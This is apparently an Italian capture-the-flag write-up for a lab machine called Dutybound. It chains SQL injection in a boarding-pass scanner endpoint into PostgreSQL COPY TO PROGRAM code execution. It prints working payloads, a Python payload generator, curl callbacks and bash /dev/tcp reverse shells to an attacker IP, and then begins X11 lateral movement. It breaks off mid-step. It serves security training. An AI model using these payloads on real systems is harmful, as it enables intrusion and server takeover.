# Dutybound

IP vittima: 10.129.94.25
IP attaccante: 10.10.15.73
## 1. Ricognizione iniziale

Eseguiamo una scansione di tutte le porte TCP:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.94.25 -oN porte.txt
```

Spiegazione delle opzioni:

- `-p-`: controlla tutte le 65535 porte TCP.
- `--open`: mostra soltanto le porte aperte.
- `-sS`: esegue una scansione TCP SYN.
- `--min-rate 5000`: imposta una velocità minima di invio dei pacchetti.
- `-n`: evita la risoluzione DNS.
- `-Pn`: considera il target attivo senza effettuare prima il ping.
- `-oN porte.txt`: salva il risultato nel file `porte.txt`.

Troviamo tre porte aperte:

```text
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
```

La macchina presenta quindi un servizio SSH e due servizi web. Identifichiamo servizi e versioni:

```bash
sudo nmap -sC -sV -p22,80,443 10.129.94.25 -oN servizi.txt
```

Le opzioni:

- `-sC`: esegue gli script NSE predefiniti.
- `-sV`: prova a identificare le versioni dei servizi.

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.18 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://airsnacks.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg: 
|_  http/1.1
|_http-server-header: nginx/1.18.0 (Ubuntu)
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=airsnacks.htb
| Not valid before: 2026-08-26T08:17:18
|_Not valid after:  2126-08-02T08:17:18
|_http-title: 400 The plain HTTP request was sent to HTTPS port
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

|Porta|Servizio|Versione|
|---|---|---|
|22|SSH|OpenSSH 8.9p1|
|80|HTTP|nginx 1.18.0|
|443|HTTPS|nginx 1.18.0|

Nmap mostra che la porta 80 reindirizza a:

```text
https://airsnacks.htb/
```

Aggiungiamo il dominio al file `/etc/hosts` di Parrot:

```bash
sudo nano /etc/hosts
```

Inseriamo:

```text
10.129.94.25 airsnacks.htb
```
## 2. Analisi dell'applicazione web

### 2.1 Analisi del sito

Dal browser visitiamo:

```text
https://airsnacks.htb/
```

Troviamo **AirSnacks Self-Checkout**, un'applicazione che simula un chiosco aeroportuale.

Il funzionamento è semplice:

1. Premiamo **Touch to Start**.
2. Selezioniamo alcuni prodotti.
3. Li aggiungiamo al carrello.
4. Entriamo nel carrello
5. Procediamo alla scansione della carta d'imbarco.

La funzionalità più interessante è proprio lo scanner del boarding pass. L'applicazione sembra utilizzare le informazioni della carta d'imbarco per verificare l'idoneità agli acquisti esentasse.
### 2.2 Analizziamo il codice HTML della pagina principale

Per capire come è costruita l'applicazione, scarichiamo il codice HTML della homepage utilizzando `curl`:

```bash
curl -ks https://airsnacks.htb/
```

Le opzioni utilizzate sono:

- `-k`: ignora gli errori di verifica del certificato HTTPS.
- `-s`: non mostra la barra di avanzamento di curl.

Il server restituisce il codice HTML della pagina.

Troviamo il pulsante iniziale:

```html
<a class="btn btn-xl" href="/browse">Touch to start</a>
```

L'attributo `href="/browse"` ci rivela che, premendo il pulsante, il browser apre il percorso:

```text
https://airsnacks.htb/browse
```

**Alla fine dell'HTML troviamo l'informazione più interessante:**

```html
<script src="/static/app.js"></script>
```

Il tag `<script>` indica che la pagina carica un file JavaScript esterno.

L'attributo `src` ne specifica il percorso:

```text
/static/app.js
```

Dal momento che il percorso inizia con `/`, il browser lo risolve rispetto al dominio del sito.

Abbiamo quindi individuato l'indirizzo completo:

```text
https://airsnacks.htb/static/app.js
```
### 2.3 Scarichiamo il file JavaScript

Ora che conosciamo il suo indirizzo, possiamo leggerne il contenuto:

```bash
curl -ks https://airsnacks.htb/static/app.js
```

Il file contiene diverse funzioni JavaScript, fra cui:

```javascript
async function postJSON(url, body) {
  const r = await fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body || {}),
  });
  let data = {};
  try { data = await r.json(); } catch (e) {}
  return { status: r.status, data };
}
```

Questa funzione serve a inviare richieste HTTP POST utilizzando dati in formato JSON.

In particolare:

- `fetch(url, ...)`: effettua una richiesta HTTP all'indirizzo indicato.
- `method: "POST"`: utilizza il metodo POST.
- `Content-Type: application/json`: specifica il formato JSON.
- `JSON.stringify(body || {})`: converte l'oggetto JavaScript in una stringa JSON.
- `r.json()`: legge la risposta JSON del server.

Più avanti troviamo due funzioni interessanti: `initCart()` e `initScanner()`.
### 2.4 Scopriamo l'endpoint per aggiungere prodotti

All'interno della funzione `initCart()` troviamo:

```javascript
const res = await postJSON("/cart/add", { sku: b.dataset.sku });
```

Abbiamo quindi individuato un endpoint utilizzato per aggiungere prodotti al carrello:

```text
POST /cart/add
```

Il parametro `sku` contiene l'identificativo del prodotto.

Lo SKU è l'identificativo di un prodotto presente nel catalogo.
Come individuiamo uno SKU valido? Abbiamo già trovato nell'HTML della homepage il percorso `/browse`.

Visitiamo quindi:

```text
https://airsnacks.htb/browse
```

Possiamo esaminare il codice della pagina anche tramite curl:

```bash
curl -ks https://airsnacks.htb/browse
```

Nel catalogo troviamo gli identificativi dei prodotti, utilizzati dal JavaScript attraverso l'attributo `data-sku`.

Uno degli SKU validi individuati è:

```text
BER-SBW-6
```

Possiamo quindi utilizzare questo valore per aggiungere un prodotto al carrello. Possiamo quindi aggiungerlo direttamente tramite `curl`:

```bash
curl -ks -c cookies.txt \
  https://airsnacks.htb/cart/add \
  -H "Content-Type: application/json" \
  -d '{"sku":"BER-SBW-6"}'
```

- `-c cookies.txt`: salva i cookie restituiti dal server.
- `-H`: specifica l'intestazione HTTP.
- `-d`: indica i dati da inviare nel corpo della richiesta.

Otteniamo una risposta simile a:

```json
{
	"cart_id": "c_b87785d1a3", 
	"cart_size": 1
}
```

Abbiamo creato un carrello contenente un prodotto e salvato la relativa sessione nel file `cookies.txt`.
### 2.5 Scopriamo l'endpoint dello scanner

Continuiamo ad analizzare `/static/app.js`.

Troviamo la funzione:

```javascript
function initScanner() {
```

All'interno compare questo codice:

```javascript
const pending = postJSON(
    "/checkout/boarding-pass/verify",
    { raw: "" }
);
```

Questa è la scoperta più importante.

Quando l'utente preme il pulsante _Scan Boarding Pass_, il JavaScript invia una richiesta HTTP POST all'endpoint:

```text
/checkout/boarding-pass/verify
```

Passandogli un oggetto JSON:

```json
{
  "raw": ""
}
```

Il campo `raw` è quindi il parametro utilizzato per inviare i dati della carta d'imbarco al server.

Osserviamo inoltre che il JavaScript invia sempre una stringa vuota, perché lo scanner dell'interfaccia è simulato.

Infatti, poco dopo troviamo:

```javascript
screen.classList.remove("scanning");
msg.textContent = "No barcode detected";
```

L'interfaccia mostra sempre il messaggio _No barcode detected_, indipendentemente dal risultato della richiesta HTTP.

Questo non significa però che il backend non sia in grado di verificare un boarding pass: il JavaScript invia comunque la richiesta al server.

Possiamo quindi provare a comunicare direttamente con l'endpoint, passando un valore personalizzato al parametro `raw`.
### 2.6 Verifichiamo l'endpoint con curl

Ora conosciamo tutte le informazioni necessarie:

|Elemento|Valore|
|---|---|
|Metodo HTTP|`POST`|
|Endpoint|`/checkout/boarding-pass/verify`|
|Content-Type|`application/json`|
|Parametro|`raw`|
|Sessione|Cookie salvato in `cookies.txt`|

Possiamo riprodurre la richiesta effettuata dal browser:

```bash
curl -ks -b cookies.txt \
  https://airsnacks.htb/checkout/boarding-pass/verify \
  -H "Content-Type: application/json" \
  -d '{"raw":""}'
```

Questa volta utilizziamo `-b cookies.txt` per inviare il cookie della sessione che abbiamo precedentemente creato.

Il server restituisce:

```json
{
  "detail": "expected 'M' at offset 0",
  "error": "BCBP_ERR_FORMAT_CODE",
  "item": 1
}
```

Il messaggio è interessante: il server si aspetta il carattere `M` all'inizio del valore di `raw`.

Proviamo quindi a inviare esattamente quel carattere:

```bash
curl -ks -b cookies.txt \
  https://airsnacks.htb/checkout/boarding-pass/verify \
  -H "Content-Type: application/json" \
  -d '{"raw":"M"}'
```

Otteniamo:

```json
{
  "detail": "string too short: 1 < 60",
  "error": "BCBP_ERR_TRUNCATED",
  "item": 6
}
```

La risposta ci dice che il carattere iniziale è corretto, ma che il server richiede almeno 60 caratteri.

Questi due errori ci permettono di identificare il formato atteso: **IATA BCBP (Bar Coded Boarding Pass)**, il formato standard utilizzato per codificare i dati delle carte d'imbarco.
### 2.7 Il formato IATA BCBP

IATA BCBP è un formato standard utilizzato per codificare le informazioni presenti sulle carte d'imbarco.
Una stringa BCBP contiene diversi campi di lunghezza predefinita.

La tabella comprende tutti i campi utilizzati nel boarding pass, con il relativo numero di Item previsto dallo standard IATA.

|Item|Campo|Valore|Lunghezza|
|---|---|---|---|
|Dati obbligatori||||
|1|Format code|`M`|1|
|5|Numero tratte|`1`|1|
|11|Nome passeggero|`TEST/ALICE` + 10 spazi|20|
|253|Biglietto elettronico|`E`|1|
|7|Codice prenotazione (PNR)|`ABC123` + 1 spazio|7|
|26|Aeroporto di partenza|`FCO`|3|
|38|Aeroporto di destinazione|`LHR`|3|
|42|Compagnia aerea|`AZ` + 1 spazio|3|
|43|Numero volo|`0123` + 1 spazio|5|
|46|Giorno del volo nell'anno|`300`|3|
|71|Classe|`Y`|1|
|104|Posto assegnato|`012A`|4|
|107|Numero sequenziale check-in|`0001` + 1 spazio|5|
|113|Stato passeggero|`1`|1|
||Totale dati obbligatori||58|
|Dati aggiuntivi||||
|6|Lunghezza dati aggiuntivi|`1E` (30 in esadecimale)|2|
|8|Inizio dati condizionali|`>`|1|
|9|Versione BCBP|`6`|1|
|10|Lunghezza dati strutturati univoci|`0B` (11 in esadecimale)|2|
|15|Descrizione passeggero|`0`|1|
|12|Modalità di check-in|`W` (Web)|1|
|14|Modalità emissione boarding pass|`W` (Web)|1|
|22|Data emissione boarding pass|`6300`|4|
|16|Tipo documento|`B` (Boarding Pass)|1|
|21|Compagnia che emette il boarding pass|`AZ` + 1 spazio|3|
|17|Lunghezza dati strutturati ripetuti|`03` (3 in esadecimale)|2|
|142|Codice numerico compagnia aerea|`055`|3|
|4|For Individual Airline Use — SQL Injection|`TEST'DATA1`|10|
||Totale dati aggiuntivi (incluso Item 6)||32|
||Lunghezza totale boarding pass||90|
I campi vengono concatenati senza separatori.

Quando un campo contiene meno caratteri del previsto, viene completato con spazi.

Per esempio, il nome:

```text
TEST/ALICE
```

deve occupare 20 caratteri, quindi aggiungiamo dieci spazi. La parte obbligatoria del nostro boarding pass occupa **58 caratteri**. Subito dopo troviamo un campo di due caratteri che indica, in esadecimale, la lunghezza dei dati condizionali.

Seguono poi i dati condizionali, questi possono includere informazioni specifiche della compagnia aerea.

La struttura complessiva è:

```
[58 caratteri obbligatori]
[2 caratteri: Item 6, lunghezza dei dati aggiuntivi]
[20 caratteri: dati strutturati]
[10 caratteri: Item 4]
```

Totale: 58 + 2 + 20 + 10 = 90 caratteri.

I numeri degli Item non sono consecutivi perché identificano i campi definiti dallo standard IATA, non la loro posizione nella stringa.

## 3. SQL Injection

Lo standard IATA BCBP prevede tre tipi di informazioni:

- Dati obbligatori: nome del passeggero, volo, aeroporti ecc.
- Dati condizionali: informazioni aggiuntive con una struttura precisa.
- Item 4 — For Individual Airline Use: uno spazio di lunghezza variabile riservato ai dati specifici della compagnia aerea.

Durante i nostri test abbiamo scoperto che il server controllava rigidamente i primi due gruppi di informazioni. L'Item 4 è quindi interessante perché possiamo inserirvi un testo personalizzato che viene  accettato dal parser e successivamente elaborata dal backend. **È questo il campo che utilizzeremo per inserire il payload SQL**

Abbiamo creato questo boarding pass aggiungendo a questa parte:

 ```
 M1TEST/ALICE          EABC123 FCOLHRAZ 0123 300Y012A0001 128>60B0WW6300BAZ 0D055ABCDEFGHIJ
 ```

Un testo in coda:

```
TESTDATA01
```

Ottenendo:

```
M1TEST/ALICE          EABC123 FCOLHRAZ 0123 300Y012A0001 128>60B0WW6300BAZ 0D055ABCDEFGHIJTESTDATA01
```

Quando cambieremo il testo in coda dobbiamo cambiare la lunghezza dei dati condizionali in esadecimale, quello attualmente uguale a 28:
`M1TEST/ALICE          EABC123 FCOLHRAZ 0123 300Y012A0001 1` **28** `>60B0WW6300BAZ 0D055ABCDEFGHIJTESTDATA01`

### 3.1 Verifichiamo il boarding pass

Inviamo il JSON al server:

```bash
curl -ks -i -b cookies.txt \
  https://airsnacks.htb/checkout/boarding-pass/verify \
  -H "Content-Type: application/json" \
  -d '{"raw":"M1TEST/ALICE          EABC123 FCOLHRAZ 0123 300Y012A0001 128>60B0WW6300BAZ 0D055ABCDEFGHIJTESTDATA01"}'
```

L'opzione `--data-binary @payload.json` invia il contenuto del file come corpo della richiesta HTTP.

Il server restituisce una risposta HTTP `200 OK`, con informazioni relative alla verifica della carta d'imbarco.

```json
{"audit_ref":"aud_b9aa8b53b12a","dest":"LHR","eligibility_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjYXJ0X2lkIjoiY18xMDJjOTc3OGYxIiwicmVnaW1lIjoiT0ZGX0FJUlBPUlQiLCJleGVtcHQiOmZhbHNlLCJkZXN0IjoiTEhSIiwiaWF0IjoxNzkzNTQ5NjI3LCJleHAiOjE3OTM1NDk5Mjd9.E4t1xiCjR1rgLkUZoZnCXuD2LiD81U9PQARWPzOHPbs","exempt":false,"regime":"OFF_AIRPORT"}
```

Abbiamo quindi costruito un boarding pass accettato dal parser.

Adesso possiamo inserire dati personalizzati nell'Item 4.
### 3.2 Proviamo a inserire un apostrofo

L'apostrofo è un carattere particolarmente interessante quando sospettiamo che un'applicazione utilizzi un database SQL.
Nelle query SQL, infatti, gli apostrofi delimitano le stringhe. Proviamo quindi a inserire un apostrofo nel nostro payload.

Generiamo un nuovo boarding pass con questo testo in coda

```bash
"TEST'DATA1"
```

quindi:

```
M1TEST/ALICE          EABC123 FCOLHRAZ 0123 300Y012A0001 128>60B0WW6300BAZ 0D055ABCDEFGHIJTEST'DATA1
```

Inviamolo:

```bash
curl -ks -i -b cookies.txt \
  https://airsnacks.htb/checkout/boarding-pass/verify \
  -H "Content-Type: application/json" \
  -d "{\"raw\": \"M1TEST/ALICE          EABC123 FCOLHRAZ 0123 300Y012A0001 128>60B0WW6300BAZ 0D055ABCDEFGHIJTEST'DATA1\"}"
```

Per poter usare l'apostrofo dobbiamo racchiudere l'intero blocco `-d` tra doppi apici (`"`) ed effettua l'escape (`\`) di tutti i doppi apici interni che fanno parte della sintassi JSON.

Il server restituisce un errore PostgreSQL:

```
HTTP/1.1 500 INTERNAL SERVER ERROR
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 01 Nov 2026 16:24:54 GMT
Content-Type: application/json
Content-Length: 216
Connection: keep-alive
Vary: Cookie

{"detail":"syntax error at or near \"DATA1\"\nLINE 1: ...AZ', '0123', '300', 'FCO', 'LHR', '', '', 100, 'TEST'DATA1')\n                                                                ^\n","error":"DCS_ERR_INTERNAL"}
```

Questo risultato è molto importante. L'errore non proviene dal parser BCBP, ma dal database PostgreSQL.
Significa che il contenuto dell'Item 4 è arrivato fino a una query SQL.
### 3.3 Perché l'apostrofo provoca un errore?

Il backend registra informazioni relative al boarding pass all'interno del database PostgreSQL.

Una porzione della query è simile a:

```sql
INSERT INTO bp_scan_audit (...)
VALUES (..., 'TESTDATA1');
```

Il nostro input contiene però un apostrofo:

```text
TEST'DATA1
```

Se viene inserito direttamente nella query SQL, il risultato diventa:

```sql
INSERT INTO bp_scan_audit (...)
VALUES (..., 'TEST'DATA1');
```

Il database interpreta l'apostrofo dopo `TEST` come la fine della stringa.

Il testo `DATA1` rimane quindi fuori dalla stringa e provoca un errore di sintassi.

**Abbiamo individuato una SQL Injection.**

Possiamo ora provare a inserire espressioni PostgreSQL ed esaminare gli errori restituiti.
## 4. Identificazione dell'utente PostgreSQL

### 4.1 Utilizziamo CURRENT_USER

PostgreSQL dispone della variabile:

```sql
CURRENT_USER
```

che restituisce il nome dell'utente con cui viene eseguita la query.

Possiamo sfruttare un semplice comportamento di PostgreSQL: quando proviamo a convertire una stringa non numerica in un numero intero, il database genera un errore contenente il valore della stringa.

Per esempio:

```sql
SELECT 'pippo'::INT;
```

genera un errore perché `pippo` non può essere convertito in un intero.

Utilizziamo quindi:

```sql
CURRENT_USER::INT
```
### 4.2 Costruiamo il payload

Usiamo questo: 

```
M1TEST/ALICE          EABC123 FCOLHRAZ 0123 300Y012A0001 137>60B0WW6300BAZ 0D055ABCDEFGHIJX'||CURRENT_USER::INT||'Y
```

La parte interessante è:

```sql
'||CURRENT_USER::INT||'
```

Gli operatori `||` concatenano stringhe in PostgreSQL.

Il nostro input chiude la stringa originale, introduce l'espressione `CURRENT_USER::INT` e poi riapre una stringa.

Inviamo il payload:

```bash
curl -ks -i -b cookies.txt \
  https://airsnacks.htb/checkout/boarding-pass/verify \
  -H "Content-Type: application/json" \
  -d "{\"raw\": \"M1TEST/ALICE          EABC123 FCOLHRAZ 0123 300Y012A0001 137>60B0WW6300BAZ 0D055ABCDEFGHIJX'||CURRENT_USER::INT||'Y\"}"
```

Otteniamo:

```text
invalid input syntax for type integer: "airsnacks_app"
```

Abbiamo scoperto che l'applicazione utilizza il ruolo PostgreSQL:

```text
airsnacks_app
```

Ora vogliamo capire quali privilegi possiede questo ruolo.
## 5. Verifica dei privilegi PostgreSQL

### 5.1 Il ruolo pg_execute_server_program

PostgreSQL mette a disposizione un privilegio particolare:

```text
pg_execute_server_program
```

Questo privilegio permette di eseguire programmi sul sistema operativo attraverso funzionalità come `COPY TO PROGRAM`.

Se `airsnacks_app` possiede questo privilegio, potremmo trasformare la SQL Injection in una Remote Code Execution.

Possiamo verificarlo utilizzando la funzione PostgreSQL:

```sql
pg_has_role(
    current_user,
    'pg_execute_server_program',
    'USAGE'
)
```

La funzione restituisce:

- `true` se il ruolo possiede il privilegio.
- `false` in caso contrario.
### 5.2 Interroghiamo il database

Riutilizziamo la stessa tecnica basata sugli errori.

```
M1TEST/ALICE          EABC123 FCOLHRAZ 0123 300Y012A0001 170>60B0WW6300BAZ 0D055ABCDEFGHIJX'||(pg_has_role(current_user,'pg_execute_server_program','USAGE'))::text::int||'Y
```

Inviamo:

```bash
curl -ks -i -b cookies.txt \
  https://airsnacks.htb/checkout/boarding-pass/verify \
  -H "Content-Type: application/json" \
  -d "{\"raw\": \"M1TEST/ALICE          EABC123 FCOLHRAZ 0123 300Y012A0001 170>60B0WW6300BAZ 0D055ABCDEFGHIJX'||(pg_has_role(current_user,'pg_execute_server_program','USAGE'))::text::int||'Y\"}"
```

La risposta contiene:

```text
invalid input syntax for type integer: "true"
```

Il risultato della funzione è `true`.

**Abbiamo confermato che** `**airsnacks_app**` **possiede il privilegio** `**pg_execute_server_program**`**.**

Ora possiamo provare a eseguire comandi sul sistema operativo.
## 6. Remote Code Execution tramite PostgreSQL

### 6.1 Come funziona COPY TO PROGRAM?

PostgreSQL permette agli utenti autorizzati di eseguire un programma mediante questa sintassi:

```sql
COPY (SELECT 1) TO PROGRAM 'comando';
```

Il comando indicato viene eseguito sul server che ospita PostgreSQL.

Per esempio:

```sql
COPY (SELECT 1) TO PROGRAM 'id';
```

fa eseguire il comando Linux `id` al processo PostgreSQL.

Il programma viene eseguito con i privilegi dell'utente del sistema operativo che gestisce il database.

Nel nostro caso, tale utente è `postgres`.
### 6.2 Costruiamo una Stacked SQL Injection

Fino a questo momento abbiamo sfruttato espressioni SQL all'interno della query originale.

Ora vogliamo aggiungere una seconda istruzione SQL.

Per farlo dobbiamo:

1. Chiudere la stringa vulnerabile.
2. Terminare la query originale.
3. Inserire una nuova istruzione SQL.
4. Commentare il resto della query.

La struttura del payload è:

```sql
X'); COPY (SELECT 1) TO PROGRAM 'comando';--
```

Significato:

|Elemento|Funzione|
|---|---|
|`X'`|Chiude la stringa SQL|
|`)`|Chiude la lista dei valori|
|`;`|Termina l'istruzione originale|
|`COPY ... TO PROGRAM`|Esegue un comando Linux|
|`--`|Commenta il resto della query|

Questa tecnica si chiama **Stacked SQL Injection**, perché permette di aggiungere ulteriori istruzioni SQL.
### 6.3 Verifichiamo l'esecuzione con curl

Prima di provare una reverse shell, verifichiamo di poter eseguire un semplice comando Linux.

Su Parrot avviamo un server HTTP:

```bash
python3 -m http.server 8000
```

Il server rimane in ascolto sulla porta 8000.

Ora costruiamo un payload che faccia eseguire a PostgreSQL questo comando:

```bash
curl -m 5 -s http://10.10.15.73:8000/pg-rce
```

Se funziona, la macchina target effettuerà una richiesta HTTP verso il nostro Parrot.

Utilizziamo: 

```
M1TEST/ALICE          EABC123 FCOLHRAZ 0123 300Y012A0001 16E>60B0WW6300BAZ 0D055ABCDEFGHIJX'); COPY (SELECT 1) TO PROGRAM 'curl -m 5 -s http://10.10.15.73:8000/pg-rce';--
```

Inviamo:

``` bash
curl -ks -i -b cookies.txt \
  https://airsnacks.htb/checkout/boarding-pass/verify \
  -H "Content-Type: application/json" \
  -d "{\"raw\": \"M1TEST/ALICE          EABC123 FCOLHRAZ 0123 300Y012A0001 16E>60B0WW6300BAZ 0D055ABCDEFGHIJX'); COPY (SELECT 1) TO PROGRAM 'curl -m 5 -s http://10.10.15.73:8000/pg-rce';--\"}"
```

Sul server HTTP di Parrot compare:

```text
10.129.231.23 "GET /pg-rce HTTP/1.1" 404 -
```

Questo dimostra che la macchina target ha eseguito il nostro comando `curl`.

Il codice HTTP `404` non è un problema: la risorsa `/pg-rce` non esiste, ma quello che ci interessa è che la richiesta sia arrivata.

**Remote Code Execution confermata.**
## 7. Initial Foothold: reverse shell come postgres

Abbiamo dimostrato che possiamo eseguire comandi Linux. Ora utilizziamo questa possibilità per ottenere una shell interattiva.
### 7.1 Avviamo il listener su Parrot

Apriamo un terminale e lanciamo:

```bash
nc -lvnp 4444
```

Netcat rimane in ascolto sulla porta TCP 4444.
### 7.2 Prepariamo il comando Bash

Il comando per ottenere la reverse shell è:

```bash
bash -i >& /dev/tcp/10.10.15.73/4444 0>&1
```

Spiegazione:

- `bash -i`: avvia una shell Bash interattiva.
- `/dev/tcp/10.10.15.73/4444`: apre una connessione TCP verso Parrot.
- `>&`: reindirizza standard output e standard error.
- `0>&1`: reindirizza lo standard input verso la stessa connessione.

Vogliamo eseguire questo comando attraverso PostgreSQL.
### 7.3 Generiamo il payload SQL

Utilizziamo:

```
M1TEST/ALICE          EABC123 FCOLHRAZ 0123 300Y012A0001 178>60B0WW6300BAZ 0D055ABCDEFGHIJX'); COPY (SELECT 1) TO PROGRAM 'bash -c ''bash -i >& /dev/tcp/10.10.15.73/4444 0>&1''';--
```

Gli apostrofi duplicati `''` servono a rappresentare gli apostrofi interni alla stringa SQL di PostgreSQL.

Il comando Linux che vogliamo ottenere è:

```bash
bash -c 'bash -i >& /dev/tcp/10.10.15.73/4444 0>&1'
```
### 7.4 Lanciamo l'exploit

Inviamo il boarding pass:

```bash
curl -ks --max-time 10 -b cookies.txt \
  https://airsnacks.htb/checkout/boarding-pass/verify \
  -H "Content-Type: application/json" \
  -d "{\"raw\": \"M1TEST/ALICE          EABC123 FCOLHRAZ 0123 300Y012A0001 178>60B0WW6300BAZ 0D055ABCDEFGHIJX'); COPY (SELECT 1) TO PROGRAM 'bash -c ''bash -i >& /dev/tcp/10.10.15.73/4444 0>&1''';--\"}"
```

L'opzione `--max-time 10` evita che curl rimanga bloccato indefinitamente.

Sul listener Netcat riceviamo una connessione.

Verifichiamo l'identità:

```bash
whoami
id
hostname
```

Otteniamo:

```text
postgres
uid=114(postgres) gid=121(postgres) groups=121(postgres),120(ssl-cert)
dutyfree-kiosk7
```

**Abbiamo ottenuto la prima shell sulla macchina come utente** `**postgres**`**.**
### 7.5 Script python

Per generare i vari payload utilizzati abbiamo usato questo script **python** chiamato `bcbp.py`  che riceve come primo argomento il comando da inserire nel payload:

```python
import sys

payload = sys.argv[1] if len(sys.argv) > 1 else ""

# Parte obbligatoria: 58 caratteri
base = (
    "M1"
    + "TEST/ALICE".ljust(20)
    + "E"
    + "ABC123 "
    + "FCO"
    + "LHR"
    + "AZ "
    + "0123 "
    + "300"
    + "Y"
    + "012A"
    + "0001 "
    + "1"
)

print(f"Base: {base}")

# Dati condizionali
unique = "0WW6300BAZ "
repeated = "055ABCDEFGHIJ"

conditional = (
    ">6"
    + f"{len(unique):02X}"
    + unique
    + f"{len(repeated):02X}"
    + repeated
    + payload
)

print(f"Condizionali: {conditional}")

# Lunghezza dei dati condizionali in esadecimale

print(f"Lunghezza dati condizionali: {len(conditional):02X}")

raw = base + f"{len(conditional):02X}" + conditional

print(f"Payload: {raw}")

assert len(base) == 58
assert len(conditional) <= 255

print("Boarding pass creato:", len(raw), "caratteri")

```

Ad esempio con:

```bash
python3 bcbp.py "X'); COPY (SELECT 1) TO PROGRAM 'bash -c ''bash -i >& /dev/tcp/10.10.15.73/4444 0>&1''';--"
```

Otteniamo:

```
Base: M1TEST/ALICE          EABC123 FCOLHRAZ 0123 300Y012A0001 1
Condizionali: >60B0WW6300BAZ 0D055ABCDEFGHIJX'); COPY (SELECT 1) TO PROGRAM 'bash -c ''bash -i >& /dev/tcp/10.10.15.73/4444 0>&1''';--
Lunghezza dati condizionali: 78
Payload: M1TEST/ALICE          EABC123 FCOLHRAZ 0123 300Y012A0001 178>60B0WW6300BAZ 0D055ABCDEFGHIJX'); COPY (SELECT 1) TO PROGRAM 'bash -c ''bash -i >& /dev/tcp/10.10.15.73/4444 0>&1''';--
Boarding pass creato: 180 caratteri
```
### 7.6 Stabilizziamo la shell

La shell ricevuta tramite Netcat non è un terminale completamente interattivo.

Possiamo migliorarla con Python:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Premiamo `Ctrl+Z` per sospendere temporaneamente Netcat.

Sul terminale Parrot eseguiamo:

```bash
stty raw -echo; fg
```

Premiamo Invio, quindi:

```bash
export TERM=xterm
```

Ora abbiamo una shell più comoda da utilizzare.
## 8. Movimento laterale: da postgres a dutyfree-kiosk

Abbiamo ottenuto una shell come `postgres`. Ora cerchiamo un modo per aumentare i privilegi.

### 8.1 Individuiamo gli utenti e i processi

Eseguiamo:

```bash
grep '/bin/bash' /etc/passwd
```

Troviamo tre utenti:

```text
root:x:0:0:root:/root:/bin/bash
dutyfree-kiosk:x:1000:1000::/home/dutyfree-kiosk:/bin/bash
postgres:x:114:121:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
```

L'utente `dutyfree-kiosk` è interessante perché sembra essere l'account utilizzato per eseguire il chiosco aeroportuale.

Controlliamo le directory personali:

```bash
ls -la /home
```

Troviamo la directory:

```text
/home/dutyfree-kiosk
```

Ma l'utente `postgres` non possiede i permessi necessari per accedervi. Il nostro prossimo obiettivo è diventare `dutyfree-kiosk`, un altro utente presente sulla macchina.
### 8.2 Scopriamo che dutyfree-kiosk utilizza una sessione grafica

Controlliamo i processi in esecuzione:

```bash
ps auxww
```

Tra i risultati troviamo:

```text
dutyfre+    1767  0.0  0.5 228600 20244 tty7     S    20:49   0:00 /usr/bin/openbox --startup /usr/lib/x86_64-linux-gnu/openbox-autostart OPENBOX

e

dutyfre+    1770  1.2  9.8 3304408 394284 tty7   Sl   20:49   0:36 /snap/firefox/8803/usr/lib/firefox/firefox --kiosk https://airsnacks.htb
```

Questo ci dice che l'utente `dutyfree-kiosk` sta utilizzando una sessione grafica con **Openbox**, un gestore di finestre per X11. Vogliamo verificare se possiamo interagire con questa sessione grafica dalla nostra shell `postgres`.
### 8.3 Verifichiamo l'accesso a X11

Eseguiamo:

```bash
DISPLAY=:0 xset q
```

Il comando restituisce le impostazioni del display.

Questo significa che `postgres` riesce a collegarsi al server grafico X11.

Controlliamo se è disponibile l'estensione XTEST:

```bash
DISPLAY=:0 xdpyinfo -queryExtensions | grep XTEST
```

Risultato:

```text
XTEST (opcode: 133)
```

**XTEST permette di simulare la pressione dei tasti sulla tastiera.**

Possiamo quindi provare a utilizzare la sessione grafica di `dutyfree-kiosk` per eseguire un comando.
### 8.4 Scopriamo come aprire un terminale

Openbox permette di associare combinazioni di tasti a determinati programmi.

Cerchiamo nel suo file di configurazione **rc.xml** una scorciatoia per aprire un terminale:

> Il file `/etc/xdg/openbox/rc.xml` è il file di configurazione predefinito di sistema per il window manager Openbox
> Definisce il comportamento globale della sessione Openbox, incluse le scorciatoie da tastiera (`<keyboard>`), le impostazioni del mouse, i desktop virtuali, il tema visivo, la gestione delle finestre e le regole per singole applicazioni (`<applications>`).

```bash
grep -A 3 'keybind' /etc/xdg/openbox/rc.xml
```

Troviamo:

```xml
<keybind key="C-A-t"><action name="Execute"><command>xterm</command></action></keybind>
```

Abbiamo scoperto che premendo **Ctrl+Alt+T** viene aperto un terminale `xterm`.

Se simuliamo questa combinazione con XTEST, Openbox aprirà un terminale come `dutyfree-kiosk`. Possiamo sfruttare questa funzionalità utilizzando **xdotool**, un programma che permette di simulare la pressione dei tasti tramite XTEST.

Il programma non è installato sulla macchina e non abbiamo i privilegi root per installarlo. Possiamo però scaricarlo su Parrot, trasferirlo al target e utilizzarlo senza installazione.

Potremo poi scrivere un comando al suo interno.
### 8.5 Prepariamo la reverse shell

Dalla shell `postgres` creiamo un file Bash:

```bash
cat > /tmp/duty.sh <<'EOF'
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/10.10.15.73/5555 0>&1'
EOF
```

Impostiamo i permessi:

```bash
chmod 755 /tmp/duty.sh
```

